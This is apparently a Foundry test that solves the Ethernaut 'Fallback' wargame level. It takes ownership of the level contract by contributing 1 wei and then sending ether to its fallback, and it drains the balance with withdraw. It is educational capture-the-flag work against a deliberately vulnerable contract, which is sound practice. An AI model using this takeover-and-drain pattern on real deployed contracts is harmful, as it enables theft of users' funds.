// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fallback/Fallback.sol";
import "../src/Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address player = makeAddr("player");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 1 ether);
        vm.label(player, "player");
    }

    function test_fallback_attack() public {
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);

        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(player), 1 wei);

        (bool success, bytes memory data) = payable(address(ethernautFallback))
            .call{value: 1 wei}("");
        require(success, "send ether failed");
        assertEq(ethernautFallback.owner(), player);

        console.log(
            "Target contract before withdraw balance:",
            address(ethernautFallback).balance
        );
        ethernautFallback.withdraw();
        console.log(
            "Target contract after withdraw balance:",
            address(ethernautFallback).balance
        );

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
